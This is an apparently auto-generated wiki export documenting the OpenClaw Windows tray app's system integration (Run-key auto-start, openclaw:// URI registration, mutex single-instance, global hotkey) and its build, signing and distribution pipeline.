- [src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs](src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs)
- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml)
- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs)
- [src/OpenClaw.Tray/DEVELOPMENT.md](src/OpenClaw.Tray/DEVELOPMENT.md)
- [src/OpenClaw.Tray/Program.cs](src/OpenClaw.Tray/Program.cs)
- [src/OpenClaw.Tray/README.md](src/OpenClaw.Tray/README.md)
- [src/OpenClaw.Tray/SettingsDialog.cs](src/OpenClaw.Tray/SettingsDialog.cs)

</details>



This document covers Windows system-level integrations including auto-start functionality, single-instance enforcement, URI scheme registration, and global hotkey support. These features enable the OpenClaw Tray application to behave as a first-class Windows citizen, launching automatically on login and responding to system-wide events.

For information about URI handling and deep link processing logic, see [Deep Links & URI Schemes](#5.2). For user-facing settings UI, see [Settings Window](#5.1).

---

## Overview of System Integration Points

The OpenClaw Windows Hub integrates with the Windows operating system through four primary mechanisms:

| Integration | Purpose | Storage Location | Implementation |
|------------|---------|------------------|----------------|
| **Auto-Start** | Launch tray app on Windows login | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `AutoStartManager` |
| **URI Scheme** | Handle `openclaw://` deep links | `HKCR\openclaw` registry key | `DeepLinkHandler.RegisterUriScheme()` |
| **Single Instance** | Prevent multiple app instances | Named mutex `OpenClawTray` | `Program.Main()` |
| **Global Hotkey** | System-wide keyboard shortcut | Win32 API hook | `GlobalHotkey` class |

**Diagram: System Integration Architecture**

```mermaid
graph TB
    subgraph "Windows Registry"
        RunKey["HKCU\...\Run<br/>OpenClawTray = EXE path"]
        URIKey["HKCR\openclaw<br/>URL Protocol handler"]
    end
    
    subgraph "Windows APIs"
        Mutex["Mutex<br/>Name: OpenClawTray"]
        Hotkey["RegisterHotKey<br/>MOD_CONTROL | MOD_ALT | MOD_SHIFT<br/>Key: C"]
        NamedPipe["NamedPipeServerStream<br/>Name: OpenClawTray-DeepLink"]
    end
    
    subgraph "Application Code"
        ProgramMain["Program.Main()"]
        AutoStartMgr["AutoStartManager"]
        DeepLinkHandler["DeepLinkHandler"]
        GlobalHotkeyClass["GlobalHotkey"]
        SettingsWindow["SettingsWindow"]
    end
    
    subgraph "User Actions"
        Login["Windows Login"]
        ClickURI["Click openclaw:// link"]
        PressHotkey["Press Ctrl+Alt+Shift+C"]
        ToggleAutoStart["Toggle Auto-Start in Settings"]
    end
    
    Login --> RunKey
    RunKey --> ProgramMain
    
    ToggleAutoStart --> SettingsWindow
    SettingsWindow --> AutoStartMgr
    AutoStartMgr --> RunKey
    
    ClickURI --> URIKey
    URIKey --> ProgramMain
    ProgramMain --> DeepLinkHandler
    
    ProgramMain --> Mutex
    Mutex --> NamedPipe
    
    PressHotkey --> Hotkey
    Hotkey --> GlobalHotkeyClass
    
    ProgramMain --> DeepLinkHandler
    DeepLinkHandler --> URIKey
```

**Sources:** [src/OpenClaw.Tray/Program.cs:1-204](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:1-197]()

---

## Auto-Start with Windows

The auto-start feature enables the tray application to launch automatically when Windows starts, ensuring that OpenClaw connectivity is always available.

### Registry-Based Implementation

Auto-start is implemented using the Windows Registry `Run` key, which Windows Explorer checks during login to launch registered applications. The application stores its executable path in the current user's Run key to avoid requiring administrator privileges.

**Registry Location:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

**Registry Entry:**
- **Key Name:** `OpenClawTray`
- **Value:** Full path to the executable (e.g., `C:\Users\Username\AppData\Local\OpenClaw\OpenClaw.Tray.WinUI.exe`)

### AutoStartManager Class

The `AutoStartManager` class provides static methods to read, write, and remove the registry entry. The implementation is referenced but not visible in the provided files, though it is invoked from the settings save logic.

**Usage Pattern:**

[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:95]()
```csharp
AutoStartManager.SetAutoStart(_settings.AutoStart);
```

This method is called whenever settings are saved, synchronizing the registry state with the user's preference.

### Settings UI Integration

Both the WinUI and WinForms tray applications provide a toggle switch/checkbox for auto-start:

**WinUI Settings:**
[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:44-50]()
```xml
<StackPanel Spacing="8">
    <TextBlock Text="STARTUP" Style="{StaticResource CaptionTextBlockStyle}"
               Foreground="#E74C3C" FontWeight="Bold"/>
    
    <ToggleSwitch x:Name="AutoStartToggle" Header="Start automatically with Windows"/>
    <ToggleSwitch x:Name="GlobalHotkeyToggle" Header="Global hotkey (Ctrl+Alt+Shift+C → Quick Send)"/>
</StackPanel>
```

**WinForms Settings:**
[src/OpenClaw.Tray/SettingsDialog.cs:88-101]()

The setting is persisted to `settings.json` and applied to the registry on save:

[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:69-96]()

**Diagram: Auto-Start Flow**

```mermaid
sequenceDiagram
    participant User
    participant SettingsWindow
    participant SettingsManager
    participant AutoStartManager
    participant Registry["Windows Registry<br/>HKCU\...\Run"]
    participant WindowsExplorer["Windows Explorer"]
    
    User->>SettingsWindow: Toggle "Start automatically with Windows"
    User->>SettingsWindow: Click "Save"
    SettingsWindow->>SettingsManager: AutoStart = true
    SettingsManager->>SettingsManager: Save settings.json
    SettingsWindow->>AutoStartManager: SetAutoStart(true)
    AutoStartManager->>Registry: Write OpenClawTray = exe_path
    
    Note over User,Registry: Later: User logs in to Windows
    
    WindowsExplorer->>Registry: Read Run key entries
    Registry-->>WindowsExplorer: OpenClawTray = exe_path
    WindowsExplorer->>ProgramMain["Program.Main()"]: Launch executable
    ProgramMain->>TrayApplication["TrayApplication"]: Initialize
```

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:44-50](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:69-96](), [src/OpenClaw.Tray/SettingsDialog.cs:88-101]()

---

## Single-Instance Enforcement

The application uses a named mutex to prevent multiple instances from running simultaneously. When a second instance is launched, it detects the existing instance and exits gracefully (or forwards deep link arguments via IPC).

### Mutex Implementation

[src/OpenClaw.Tray/Program.cs:26-40]()

The mutex is created with the name `"OpenClawTray"`. If `createdNew` is `false`, another instance is already running.

**Diagram: Single-Instance Check Flow**

```mermaid
flowchart TD
    Start["Application Launch<br/>Program.Main()"]
    CreateMutex["Create Mutex<br/>Name: 'OpenClawTray'"]
    CheckNew{"Mutex.createdNew<br/>== true?"}
    HasArgs{"args.Length > 0<br/>args[0] starts with<br/>'openclaw://'?"}
    SendPipe["SendDeepLinkToRunningInstance()<br/>via Named Pipe"]
    ShowMessage["MessageBox.Show()<br/>'Already running'"]
    Exit["return (exit)"]
    RegisterURI["DeepLinkHandler.RegisterUriScheme()"]
    Launch["Launch TrayApplication"]
    
    Start --> CreateMutex
    CreateMutex --> CheckNew
    CheckNew -->|false| HasArgs
    HasArgs -->|true| SendPipe
    HasArgs -->|false| ShowMessage
    SendPipe --> Exit
    ShowMessage --> Exit
    CheckNew -->|true| RegisterURI
    RegisterURI --> Launch
```

**Sources:** [src/OpenClaw.Tray/Program.cs:26-40]()

### Deep Link Forwarding via Named Pipes

When a second instance is launched with an `openclaw://` argument, it forwards the URI to the running instance via a named pipe:

[src/OpenClaw.Tray/Program.cs:159-176]()

The running instance listens for incoming deep links on a server pipe:

[src/OpenClaw.Tray/Program.cs:178-203]()

**Named Pipe Configuration:**
- **Pipe Name:** `"OpenClawTray-DeepLink"`
- **Direction:** `PipeDirection.In` (server), `PipeDirection.Out` (client)
- **Connection Timeout:** 1 second

**Diagram: Deep Link Forwarding via IPC**

```mermaid
sequenceDiagram
    participant User
    participant Instance2["Second Instance<br/>Program.Main()"]
    participant NamedPipeClient["NamedPipeClientStream<br/>Name: OpenClawTray-DeepLink"]
    participant NamedPipeServer["NamedPipeServerStream<br/>(Running Instance)"]
    participant Instance1["First Instance<br/>TrayApplication"]
    
    User->>Instance2: Click openclaw://send?message=Hello
    Instance2->>Instance2: Mutex check: createdNew = false
    Instance2->>NamedPipeClient: Connect("OpenClawTray-DeepLink")
    NamedPipeClient->>NamedPipeServer: Write "openclaw://send?message=Hello"
    NamedPipeServer->>Instance1: onDeepLinkReceived(uri)
    Instance1->>Instance1: Process deep link
    Instance2->>User: Exit silently
```

**Sources:** [src/OpenClaw.Tray/Program.cs:159-203]()

---

## URI Scheme Registration

The application registers the `openclaw://` URI protocol handler during first run, enabling web browsers and other applications to launch the tray app with deep link arguments.

### Registry Setup

[src/OpenClaw.Tray/Program.cs:43]()

The `DeepLinkHandler.RegisterUriScheme()` method writes registry keys to `HKEY_CLASSES_ROOT`:

**Registry Structure:**
```
HKEY_CLASSES_ROOT\openclaw
    (Default) = "URL:OpenClaw Protocol"
    URL Protocol = ""
    
    DefaultIcon
        (Default) = "C:\Path\To\OpenClaw.Tray.exe,0"
    
    shell\open\command
        (Default) = "C:\Path\To\OpenClaw.Tray.exe" "%1"
```

The `"%1"` placeholder is replaced by Windows with the full URI (e.g., `openclaw://send?message=test`).

### URI Handling Flow

Once registered, clicking an `openclaw://` link in a browser or document triggers the following sequence:

1. Windows checks `HKCR\openclaw\shell\open\command` for the handler
2. Windows launches the executable with the URI as `args[0]`
3. `Program.Main()` detects the URI argument
4. If another instance is running, forwards via named pipe
5. Otherwise, processes the deep link after initialization

For details on URI parsing and command execution, see [Deep Links & URI Schemes](#5.2).

**Sources:** [src/OpenClaw.Tray/Program.cs:43](), [src/OpenClaw.Tray/Program.cs:30-33]()

---

## Global Hotkey Registration

The global hotkey feature allows users to press `Ctrl+Alt+Shift+C` from anywhere in Windows to open the Quick Send dialog, regardless of which application has focus.

### Settings Configuration

Both tray applications provide a toggle for enabling/disabling the global hotkey:

[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:49]()
```xml
<ToggleSwitch x:Name="GlobalHotkeyToggle" Header="Global hotkey (Ctrl+Alt+Shift+C → Quick Send)"/>
```

[src/OpenClaw.Tray/SettingsDialog.cs:99-100]()

The setting is persisted as `GlobalHotkeyEnabled` or `ShowGlobalHotkey` in `settings.json`.

### GlobalHotkey Class

The `GlobalHotkey` class (not provided in files, but referenced throughout) uses the Win32 `RegisterHotKey` API to register a system-wide keyboard hook:

**API Parameters:**
- **Modifiers:** `MOD_CONTROL | MOD_ALT | MOD_SHIFT` (0x0001 | 0x0002 | 0x0004 = 0x0007)
- **Virtual Key:** `VK_C` (0x43)
- **Window Handle:** Message-only window handle for receiving `WM_HOTKEY` messages

**Usage Pattern:**
```csharp
var hotkey = new GlobalHotkey(MOD_CONTROL | MOD_ALT | MOD_SHIFT, Keys.C);
hotkey.HotkeyPressed += (s, e) => ShowQuickSendDialog();
```

The hotkey is registered during application startup if `GlobalHotkeyEnabled` is `true`, and unregistered during shutdown or when disabled in settings.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:49](), [src/OpenClaw.Tray/SettingsDialog.cs:99-100]()

---

## System Integration Summary

**Diagram: Registry and System Integration Points**

```mermaid
graph TB
    subgraph "Windows Registry Locations"
        HKCU_Run["HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br/>OpenClawTray = exe_path"]
        HKCR_openclaw["HKEY_CLASSES_ROOT\openclaw<br/>URL Protocol<br/>DefaultIcon<br/>shell\open\command"]
    end
    
    subgraph "Application Files"
        EXE["OpenClaw.Tray.WinUI.exe<br/>or OpenClaw.Tray.exe"]
        SettingsJSON["settings.json<br/>%APPDATA%\OpenClawTray\<br/>AutoStart: bool<br/>GlobalHotkeyEnabled: bool"]
    end
    
    subgraph "Runtime State"
        MutexObj["Mutex<br/>Name: OpenClawTray<br/>Global\\ namespace"]
        HotkeyHandle["Hotkey Registration<br/>Ctrl+Alt+Shift+C<br/>WM_HOTKEY message loop"]
        PipeServer["Named Pipe Server<br/>Name: OpenClawTray-DeepLink"]
    end
    
    subgraph "Code Classes"
        AutoStartManager["AutoStartManager.cs<br/>SetAutoStart(bool)<br/>GetAutoStart()"]
        DeepLinkHandler["DeepLinkHandler.cs<br/>RegisterUriScheme()"]
        GlobalHotkeyClass["GlobalHotkey.cs<br/>Register(modifiers, key)<br/>Unregister()"]
        ProgramClass["Program.cs<br/>Main(args)<br/>StartDeepLinkServer()"]
    end
    
    AutoStartManager --> HKCU_Run
    DeepLinkHandler --> HKCR_openclaw
    ProgramClass --> MutexObj
    ProgramClass --> PipeServer
    GlobalHotkeyClass --> HotkeyHandle
    
    HKCU_Run -.->|Launch on login| EXE
    HKCR_openclaw -.->|Handle URI| EXE
    SettingsJSON -.->|Read on startup| ProgramClass
    
    AutoStartManager -.->|Read/Write| SettingsJSON
```

**Sources:** [src/OpenClaw.Tray/Program.cs:1-204](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:1-197](), [src/OpenClaw.Tray/SettingsDialog.cs:1-336]()

---

## Implementation Details by Platform

Both the WinUI and WinForms tray applications share the same underlying system integration mechanisms, with minor differences in settings UI presentation:

| Feature | WinUI (Modern) | WinForms (Legacy) | Shared Component |
|---------|---------------|-------------------|------------------|
| Auto-Start Toggle | `ToggleSwitch` control | `CheckBox` control | `AutoStartManager` |
| Global Hotkey Toggle | `ToggleSwitch` control | `CheckBox` control | `GlobalHotkey` class |
| URI Registration | On first run | On first run | `DeepLinkHandler` |
| Single Instance | Mutex + named pipe | Mutex + named pipe | `Program.Main()` |
| Settings Persistence | `SettingsManager.Save()` | `SettingsManager.Save()` | JSON in `%APPDATA%` |

**Code Entity Mapping:**

```mermaid
graph LR
    subgraph "WinUI Application"
        WinUI_Settings["SettingsWindow.xaml.cs"]
        WinUI_App["App.xaml.cs"]
    end
    
    subgraph "WinForms Application"
        WinForms_Settings["SettingsDialog.cs"]
        WinForms_Program["Program.cs"]
    end
    
    subgraph "Shared Library (OpenClaw.Shared)"
        SettingsManager["SettingsManager"]
        AutoStartManager["AutoStartManager"]
        DeepLinkHandler["DeepLinkHandler"]
    end
    
    subgraph "System APIs"
        Registry["Windows Registry API"]
        Win32["Win32 RegisterHotKey"]
        Mutex_API["System.Threading.Mutex"]
    end
    
    WinUI_Settings --> SettingsManager
    WinUI_App --> DeepLinkHandler
    WinUI_App --> Mutex_API
    
    WinForms_Settings --> SettingsManager
    WinForms_Program --> DeepLinkHandler
    WinForms_Program --> Mutex_API
    
    SettingsManager --> AutoStartManager
    AutoStartManager --> Registry
    DeepLinkHandler --> Registry
```

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:1-197](), [src/OpenClaw.Tray/SettingsDialog.cs:1-336](), [src/OpenClaw.Tray/Program.cs:1-204]()

---

## First-Run Experience

During the first application launch, the welcome dialog guides users through initial configuration:

[src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs:1-133]()

The welcome dialog provides:
- Introduction to OpenClaw Tray functionality
- Link to documentation
- Quick access to Settings window

After the user configures their gateway URL and token in the Settings window, the auto-start preference is applied immediately. URI scheme registration happens automatically on first run via [src/OpenClaw.Tray/Program.cs:43]().

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs:1-133](), [src/OpenClaw.Tray/Program.cs:43]()

---

## Troubleshooting System Integration

Common issues and their resolutions:

| Issue | Cause | Resolution |
|-------|-------|-----------|
| App doesn't auto-start | Registry key missing/incorrect | Check `HKCU\...\Run\OpenClawTray` value points to current EXE path |
| `openclaw://` links don't work | Registry not registered or user lacks permissions | Run app once to register, or manually add registry keys |
| Global hotkey conflicts | Another app registered same key combination | Disable conflicting app's hotkey or change OpenClaw hotkey in settings |
| Multiple instances launch | Mutex name collision or permissions issue | Check for zombie processes in Task Manager |
| Deep link forwarding fails | Named pipe connection timeout | Check if first instance is still running and listening |

**Logging:**
All system integration operations are logged to `%LOCALAPPDATA%\OpenClawTray\openclaw-tray.log` for debugging purposes.

**Sources:** [src/OpenClaw.Tray/README.md:196-216](), [src/OpenClaw.Tray/DEVELOPMENT.md:154-169]()

---

# Page: Build & Distribution

# Build & Distribution

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/workflows/ci.yml](.github/workflows/ci.yml)
- [README.md](README.md)
- [build.ps1](build.ps1)
- [docs/VERSIONING.md](docs/VERSIONING.md)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)
- [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj](src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj)
- [src/OpenClaw.Tray.WinUI/Package.appxmanifest](src/OpenClaw.Tray.WinUI/Package.appxmanifest)
- [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs](src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs)
- [src/OpenClaw.Tray/OpenClaw.Tray.csproj](src/OpenClaw.Tray/OpenClaw.Tray.csproj)

</details>



This document provides an overview of the build and distribution system for the OpenClaw Windows Hub. It covers the supported architectures, build outputs, compilation modes, and the overall pipeline from source code to distributable artifacts. For detailed information about specific topics, see:

- [Build System](#6.1) - The `build.ps1` script and local development builds
- [CI/CD Pipeline](#6.2) - GitHub Actions workflow and automated builds
- [Packaging & Distribution](#6.3) - MSIX packages, Inno Setup installers, and ZIP archives
- [Versioning & Updates](#6.4) - GitVersion strategy and Updatum auto-update system

---

## Overview

The OpenClaw Windows Hub supports multiple build targets and distribution formats to accommodate different deployment scenarios. All projects target .NET 10 and support both x64 and ARM64 Windows platforms.

**Key Characteristics:**
- **Multi-Architecture**: x64 and ARM64 builds for all components
- **Dual Build Modes**: Packaged (MSIX) and unpackaged (standalone EXE)
- **Self-Contained Deployments**: All runtime dependencies included
- **Code Signing**: Azure Trusted Signing for all release artifacts
- **Automatic Versioning**: GitVersion derives versions from git tags

Sources: [README.md:21-59](), [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:1-62]()

---

## Build Outputs

The build system produces four primary artifact types, each serving different deployment needs:

| Artifact Type | File Extension | Use Case | Features |
|---------------|---------------|----------|----------|
| Standalone EXE | `.exe` | Traditional deployment | Single-file, self-contained, registry-based deep links |
| MSIX Package | `.msix` | Modern deployment | Package identity, camera/mic consent prompts, manifest-based deep links |
| ZIP Archive | `.zip` | Portable/auto-update | Updatum-compatible naming, portable deployment |
| Inno Setup Installer | `.exe` (installer) | End-user installation | Bundles tray app + PowerToys extension, optional auto-start |

The choice between packaged (MSIX) and unpackaged (standalone EXE) builds is controlled by the `PackageMsix` MSBuild property.

Sources: [.github/workflows/ci.yml:54-226](), [README.md:56-58]()

---

## Build Modes

### Unpackaged Mode (Default)

When `PackageMsix` is not set or is `false`, the build produces a traditional standalone executable:

```xml
<PropertyGroup Condition="'$(PackageMsix)' != 'true'">
  <WindowsPackageType>None</WindowsPackageType>
  <WindowsAppSDKSelfContained>true</WindowsAppSDKSelfContained>
  <ApplicationManifest>app.manifest</ApplicationManifest>
</PropertyGroup>
```

**Characteristics:**
- `WindowsPackageType=None` - No MSIX packaging
- Self-contained Windows App SDK runtime
- Uses `app.manifest` for UAC and compatibility settings
- Registers `openclaw://` URI scheme via Windows Registry
- WebView2Loader.dll copied to output root (see custom MSBuild target)

Sources: [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:16-20](), [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:51-60]()

### Packaged Mode (MSIX)

When `PackageMsix=true`, the build produces an MSIX package:

```xml
<PropertyGroup Condition="'$(PackageMsix)' == 'true'">
  <WindowsPackageType>MSIX</WindowsPackageType>
  <WindowsAppSDKSelfContained>true</WindowsAppSDKSelfContained>
  <AppxPackageSigningEnabled>false</AppxPackageSigningEnabled>
  <GenerateAppxPackageOnBuild>true</GenerateAppxPackageOnBuild>
  <AppxBundle>Never</AppxBundle>
  <UapAppxPackageBuildMode>SideloadOnly</UapAppxPackageBuildMode>
</PropertyGroup>
```

**Characteristics:**
- `WindowsPackageType=MSIX` - Enable MSIX packaging
- Package identity defined in `Package.appxmanifest`
- Camera and microphone capabilities declared for OS consent prompts
- URI scheme registration via manifest extensions
- Signing disabled during build (handled separately in CI)

**MSIX Manifest Identity:**
```xml
<Identity
  Name="OpenClaw.Tray"
  Publisher="CN=Scott Hanselman, O=Scott Hanselman, L=Forest Grove, S=Oregon, C=US"
  Version="0.4.4.0" />
```

Sources: [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:23-32](), [src/OpenClaw.Tray.WinUI/Package.appxmanifest:12-15](), [src/OpenClaw.Tray.WinUI/Package.appxmanifest:56-61]()

---

## Architecture Support

All projects support both x64 and ARM64 Windows platforms via runtime identifiers (RIDs):

**Runtime Identifiers:**
- `win-x64` - Intel/AMD 64-bit processors
- `win-arm64` - ARM64 processors (Surface Pro X, etc.)

**Detection Logic:**

The build system detects the target architecture from multiple sources:

```xml
<IsArm64Build Condition="'$(Platform)' == 'ARM64' OR '$(RuntimeIdentifier)' == 'win-arm64' OR '$(PROCESSOR_ARCHITECTURE)' == 'ARM64'">true</IsArm64Build>
```

This affects runtime-specific file selection (e.g., WebView2Loader.dll path).

Sources: [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:54-56](), [build.ps1:123-128](), [.github/workflows/ci.yml:57-60]()

---

## Build Flow Diagram

```mermaid
graph TB
    subgraph "Source Repository"
        Code["openclaw-windows-node<br/>GitHub Repository"]
        GitTag["Git Tag<br/>v0.4.4"]
    end
    
    subgraph "Local Development"
        BuildScript["build.ps1<br/>-Project WinUI<br/>-Configuration Debug"]
        DotnetCLI["dotnet build<br/>-r win-x64<br/>-p:PackageMsix=false"]
    end
    
    subgraph "CI Pipeline (.github/workflows/ci.yml)"
        TestJob["test job<br/>dotnet restore<br/>dotnet build<br/>dotnet test"]
        BuildJob["build job<br/>matrix: win-x64, win-arm64<br/>dotnet publish"]
        BuildMSIX["build-msix job<br/>msbuild with PackageMsix=true"]
        BuildExt["build-extension job<br/>OpenClaw.CommandPalette"]
        ReleaseJob["release job<br/>Inno Setup<br/>Azure Trusted Signing"]
    end
    
    subgraph "GitVersion Integration"
        GitVersion["GitVersion<br/>gittools/actions/gitversion"]
        SemVer["semVer output<br/>e.g., 0.4.4"]
        MajorMinorPatch["majorMinorPatch output<br/>e.g., 0.4.4"]
    end
    
    subgraph "Build Outputs"
        StandaloneEXE["OpenClaw.Tray.WinUI.exe<br/>Self-contained"]
        MSIX["OpenClawTray-0.4.4-win-x64.msix<br/>OpenClawTray-0.4.4-win-arm64.msix"]
        ZIP["OpenClawTray-0.4.4-win-x64.zip<br/>OpenClawTray-0.4.4-win-arm64.zip"]
        Installer["OpenClawTray-Setup-x64.exe<br/>OpenClawTray-Setup-arm64.exe"]
    end
    
    subgraph "Distribution"
        GitHubReleases["GitHub Releases<br/>Public download"]
        UpdatumCheck["Updatum Auto-Update<br/>Assembly.GetExecutingAssembly().GetName().Version"]
    end
    
    Code --> GitTag
    GitTag --> TestJob
    
    Code --> BuildScript
    BuildScript --> DotnetCLI
    DotnetCLI --> StandaloneEXE
    
    TestJob --> GitVersion
    GitVersion --> SemVer
    GitVersion --> MajorMinorPatch
    
    SemVer --> BuildJob
    MajorMinorPatch --> BuildMSIX
    SemVer --> BuildExt
    
    BuildJob --> StandaloneEXE
    BuildMSIX --> MSIX
    
    BuildJob --> ReleaseJob
    BuildMSIX --> ReleaseJob
    BuildExt --> ReleaseJob
    
    ReleaseJob --> ZIP
    ReleaseJob --> Installer
    
    StandaloneEXE --> GitHubReleases
    MSIX --> GitHubReleases
    ZIP --> GitHubReleases
    Installer --> GitHubReleases
    
    GitHubReleases --> UpdatumCheck
    UpdatumCheck -.->|"Checks for newer version"| StandaloneEXE
```

Sources: [.github/workflows/ci.yml:1-382](), [build.ps1:1-243](), [README.md:30-59]()

---

## Project Structure and Build Dependencies

```mermaid
graph LR
    subgraph "Projects"
        Shared["OpenClaw.Shared<br/>net10.0"]
        TrayWinUI["OpenClaw.Tray.WinUI<br/>net10.0-windows10.0.19041.0<br/>OutputType=WinExe"]
        TrayWinForms["OpenClaw.Tray<br/>net10.0-windows10.0.19041.0<br/>UseWindowsForms=true"]
        CommandPalette["OpenClaw.CommandPalette<br/>net10.0-windows10.0.19041.0"]
    end
    
    subgraph "NuGet Dependencies"
        WindowsAppSDK["Microsoft.WindowsAppSDK<br/>1.8.260101001"]
        WebView2["Microsoft.Web.WebView2<br/>1.0.3124.44"]
        Updatum["Updatum<br/>1.3.4"]
        WinUIEx["WinUIEx<br/>2.9.0"]
        Notifications["Microsoft.Toolkit.Uwp.Notifications<br/>7.1.3"]
        NSec["NSec.Cryptography<br/>25.4.0"]
    end
    
    TrayWinUI --> Shared
    TrayWinForms --> Shared
    CommandPalette --> Shared
    
    TrayWinUI --> WindowsAppSDK
    TrayWinUI --> WinUIEx
    TrayWinUI --> Updatum
    TrayWinUI --> Notifications
    
    TrayWinForms --> WebView2
    TrayWinForms --> Updatum
    TrayWinForms --> Notifications
    
    Shared --> NSec
```

Sources: [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:34-44](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:23-32](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:1-20]()

---

## Build Prerequisites

The build system checks for required components before compilation:

| Component | Purpose | Check Method | Required For |
|-----------|---------|--------------|--------------|
| .NET 10 SDK | Compilation | `dotnet --list-sdks` | All projects |
| Windows 10 SDK | WinUI compilation | Registry at `HKLM:\SOFTWARE\...\Windows Kits\10` | WinUI project |
| WebView2 Runtime | Chat window runtime | Registry at `HKLM:\SOFTWARE\...\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}` | Runtime only (not build) |
| PROCESSOR_ARCHITECTURE | RID detection | Environment variable | Architecture-specific builds |

**Prerequisite Checking:**

The `build.ps1` script performs comprehensive prerequisite checks:

```powershell
# Check .NET 10 SDK
$sdks = & dotnet --list-sdks 2>$null
$hasNet10 = $sdks | Where-Object { $_ -match "^10\." }

# Check Windows SDK
$windowsSdkPath = "${env:ProgramFiles(x86)}\Windows Kits\10\Include"
if (Test-Path $windowsSdkPath) { ... }

# Detect architecture
$arch = $env:PROCESSOR_ARCHITECTURE
$rid = if ($arch -eq "ARM64") { "win-arm64" } else { "win-x64" }
```

Sources: [build.ps1:58-128](), [README.md:23-28]()

---

## Code Signing

All release artifacts are signed using Azure Trusted Signing for authenticity and trustworthiness:

**Signing Configuration:**
- **Endpoint**: `https://wus2.codesigning.azure.net/`
- **Account**: `hanselman`
- **Certificate Profile**: `WindowsEdgeLight`
- **Digest Algorithm**: SHA256
- **Timestamp Server**: `http://timestamp.acs.microsoft.com` (RFC 3161)

**Signed Artifacts:**
1. Standalone EXE files (`*.exe` in publish folder)
2. MSIX packages (`*.msix`)
3. Inno Setup installers (`OpenClawTray-Setup-*.exe`)

**CI Signing Steps:**

```yaml
- name: Azure Login for Signing
  uses: azure/login@v2
  with:
    creds: '{"clientId":"${{ secrets.AZURE_CLIENT_ID }}",..."}'

- name: Sign Executable
  uses: azure/trusted-signing-action@v1
  with:
    endpoint: https://wus2.codesigning.azure.net/
    signing-account-name: hanselman
    certificate-profile-name: WindowsEdgeLight
    files-folder: publish
    files-folder-filter: exe
    file-digest: SHA256
```

Sources: [.github/workflows/ci.yml:78-99](), [.github/workflows/ci.yml:172-193](), [.github/workflows/ci.yml:322-340]()

---

## Distribution Artifacts

```mermaid
graph TB
    subgraph "GitHub Release (v0.4.4)"
        Release["GitHub Release<br/>Tag: v0.4.4<br/>Auto-generated notes"]
    end
    
    subgraph "Installer Artifacts"
        InnoX64["OpenClawTray-Setup-x64.exe<br/>Signed installer<br/>Tray + CommandPalette"]
        InnoARM64["OpenClawTray-Setup-arm64.exe<br/>Signed installer<br/>Tray + CommandPalette"]
    end
    
    subgraph "Portable Artifacts"
        ZIPX64["OpenClawTray-0.4.4-win-x64.zip<br/>Updatum-compatible naming"]
        ZIPARM64["OpenClawTray-0.4.4-win-arm64.zip<br/>Updatum-compatible naming"]
    end
    
    subgraph "MSIX Artifacts"
        MSIXX64["OpenClawTray-0.4.4-win-x64.msix<br/>Signed package<br/>Camera/mic consent"]
        MSIXARM64["OpenClawTray-0.4.4-win-arm64.msix<br/>Signed package<br/>Camera/mic consent"]
    end
    
    subgraph "End Users"
        EndUser1["User: Install via EXE<br/>Auto-start option<br/>Traditional deployment"]
        EndUser2["User: Sideload MSIX<br/>Camera consent prompts<br/>Modern deployment"]
        EndUser3["User: Extract ZIP<br/>Portable mode<br/>No installation"]
    end
    
    subgraph "Auto-Update System"
        UpdatumClient["Updatum Client<br/>Running in tray app"]
        UpdatumCheck["Check GitHub Releases<br/>Compare Assembly.GetExecutingAssembly()<br/>.GetName().Version"]
    end
    
    Release --> InnoX64
    Release --> InnoARM64
    Release --> ZIPX64
    Release --> ZIPARM64
    Release --> MSIXX64
    Release --> MSIXARM64
    
    InnoX64 --> EndUser1
    InnoARM64 --> EndUser1
    MSIXX64 --> EndUser2
    MSIXARM64 --> EndUser2
    ZIPX64 --> EndUser3
    ZIPARM64 --> EndUser3
    
    ZIPX64 --> UpdatumClient
    ZIPARM64 --> UpdatumClient
    UpdatumClient --> UpdatumCheck
    UpdatumCheck -.->|"Download if newer"| ZIPX64
    UpdatumCheck -.->|"Download if newer"| ZIPARM64
```

